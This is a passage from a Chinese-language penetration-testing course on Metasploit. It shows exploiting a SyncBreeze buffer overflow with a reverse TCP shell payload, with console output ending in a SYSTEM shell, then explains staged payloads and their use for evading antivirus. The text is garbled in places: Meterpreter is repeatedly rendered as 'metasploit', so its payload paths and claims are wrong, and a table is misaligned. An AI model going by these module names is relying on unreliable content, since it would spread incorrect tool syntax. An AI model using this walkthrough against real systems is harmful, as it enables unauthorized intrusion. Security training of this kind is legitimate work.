
模块选项 (`exploit/windows/http/syncbreeze_bof`)：

| 名称 | 当前设置 | 必需 | 描述 |
|---|---|---|---|
| Proxies | 无 | 代理链，格式为 type:host:port[,type:host:port]... |
| RHOST | | 是 | 目标地址 |
| RPORT | 80 | 是 | 目标端口 (TCP) |
| SSL | 假 | 否 | 为出站连接协商 SSL/TLS |
| HTTP 服务器虚拟主机 | | 否 | |

负载选项 (`windows/shell_reverse_tcp`)：

| 名称 | 当前设置 | 必需 | 描述 |
|---|---|---|---|
| EXITFUNC | thread | 是 | 退出技术 (接受: '', seh, thread, pro |
| LHOST | | 是 | 监听地址 |
| LPORT | 4444 | 是 | 监听端口 |

利用目标：

| Id | 名称 |
|---|---|
| 0 | 自动 |

清单 759 - 选择负载

负载设置下方的“Exploit target”部分列出了易受此漏洞利用影响的操作系统或软件版本。对于像 SyncBreeze 中发现的那种普通栈溢出，这些设置基本上等同于适合受影响软件不同操作系统版本或环境的不同的返回地址。在这个漏洞利用模块中，针对我们的 SyncBreeze 版本的单个静态返回地址适用于多个版本的 Windows。在其他漏洞利用中，我们通常需要使用 `set target` 设置目标以匹配我们要利用的环境。

通过为漏洞利用设置反向 shell 负载，Metasploit 自动添加了一些新的“负载选项”，包括 `LHOST`（监听主机）和 `LPORT`（监听端口），它们对应反向 shell 将连接的主机 IP 地址和端口。注意 `LPORT` 设置为默认值 `4444`，这对我们的目的来说没有问题。让我们继续设置 `LHOST` 和 `RHOST`，分别定义我们的攻击主机和目标主机。

```
msf5 exploit(windows/http/syncbreeze_bof) > set LHOST 10.11.0.4

LHOST => 10.11.0.4

msf5 exploit(windows/http/syncbreeze_bof) > set RHOST 10.11.0.22

RHOST => 10.11.0.22
```

清单 760 - 配置必需参数

在将 `LHOST` 设置为我们的 Kali IP 地址，将 `RHOST` 设置为 Windows 主机 IP 地址后，我们可以使用 `check` 来验证目标主机和应用是否易受攻击。请注意，只有当目标应用暴露某种横幅或其他可识别的数据时，此检查才有效。

```
msf5 exploit(windows/http/syncbreeze_bof) > check

[*] 10.11.0.22:80 - 目标似乎易受攻击。
```

清单 761 - 检查目标是否易受攻击

在确认目标易受攻击后，现在只剩下使用下方显示的 `exploit` 命令运行漏洞利用程序。

```
msf5 exploit(windows/http/syncbreeze_bof) > exploit

[*] 在 10.11.0.4:4444 上启动了反向 TCP 处理器

[*] 正在自动检测目标...

[*] 目标是 10.0.28

[*] 正在发送请求...

[*] 已打开命令 shell 会话 1 (10.11.0.4:4444 -> 10.11.0.22:50195)

Microsoft Windows [版本 10.0.16299.248]

(c) 2017 Microsoft Corporation。保留所有权利。

C:\Windows\system32> whoami

whoami

nt authority\system
```

清单 762 - 执行漏洞利用

注意，当执行漏洞利用时，Metasploit 会自动创建一个负载监听器，从而无需使用 Netcat。执行完成后，会创建一个会话，并且反向 shell 可供我们使用。

### 22.2.1.1 练习

- 使用现有的 Metasploit 模块利用 SyncBreeze。

## 22.3 Metasploit 负载

到目前为止，我们只利用了 `windows/shell_reverse_tcp`，这是一种简单且独立的反向 shell。Metasploit 包含除基本 shell 之外的许多其他类型的负载。让我们现在看看其中的一些。

### 22.3.1 分阶段与非分阶段负载

在深入具体的 shellcode 功能之前，我们必须讨论 *staged*（分阶段）和 *non-staged*（非分阶段）shellcode 之间的区别，正如这两个负载的描述所示：

```
windows/shell_reverse_tcp - 连接回攻击者并生成命令 shell

windows/shell/reverse_tcp - 连接回攻击者，生成 cmd shell (staged)
```

清单 763 - 分阶段与非分阶段负载的语法

这些负载之间的区别微妙但很重要。非分阶段负载是与漏洞利用程序一起完整发送的。相比之下，分阶段负载通常分为两部分发送。第一部分包含一个小的主要负载，该负载导致受害机器连接回攻击者，传输包含其余 shellcode 的较大次要负载，然后执行它。

有几种情况我们更倾向于使用分阶段 shellcode 而不是非分阶段。如果我们要利用的漏洞没有足够的缓冲区空间来容纳完整负载，那么分阶段负载可能是合适的。由于分阶段负载的第一部分通常小于完整负载，这些较小的初始负载可能有助于我们在空间受限的情况下。此外，我们需要牢记，防病毒软件通常会在漏洞利用程序中检测到嵌入的 shellcode。通过将该代码替换为分阶段负载，我们移除了 shellcode 恶意部分的一大部分，这可能会增加我们的成功率。在漏洞利用程序执行初始阶段之后，剩余的负载将被检索并直接注入到受害机器的内存中。

![](img/ec25e59d75726b7041242a56d3376832_686_0.png)

请注意，在 Metasploit 中，“/”字符用于表示载荷是否分为阶段（staged），因此 “shell_reverse_tcp” 不是分阶段载荷，而 “shell/reverse_tcp” 是。

## 22.3.2 Metasploit 载荷

正如 Metasploit 网站所述，Metasploit Meterpreter 是一种多功能载荷，可以在运行时动态扩展。实际上，这意味着 Metasploit shell 提供了比普通命令 shell 更多的特性和功能，例如文件传输、按键记录以及与受害机器交互的各种其他方法。这些工具在后期利用阶段特别有用。由于 Metasploit 的灵活性和功能，它是最受欢迎且最常用的 Metasploit 载荷。

搜索“metasploit”关键字会返回一长串结果，但如果将搜索范围缩小到载荷类别，则会显示适用于多种操作系统和架构的 metasploit 版本，包括 Windows、Linux、Android、Apple iOS、FreeBSD 和 Apple OS X/macOS。

```
msf5 > search metasploit type:payload

Matching Modules

=================

#  Name                                        Description

-

1  payload/android/metasploit/reverse_http     Android Metasploit, Android

2  payload/android/metasploit/reverse_https    Android Metasploit, Android

3  payload/android/metasploit/reverse_tcp      Android Metasploit, Android

4  payload/android/metasploit/reverse_http     Android Metasploit Shell, R

5  payload/android/metasploit/reverse_https    Android Metasploit Shell, R

6  payload/android/metasploit/reverse_tcp      Android Metasploit Shell, R

7  payload/apple_ios/aarch64/metasploit/reverse_http    Apple iOS Metasploit, Rever

8  payload/apple_ios/aarch64/metasploit/reverse_https   Apple iOS Metasploit, Rever
```
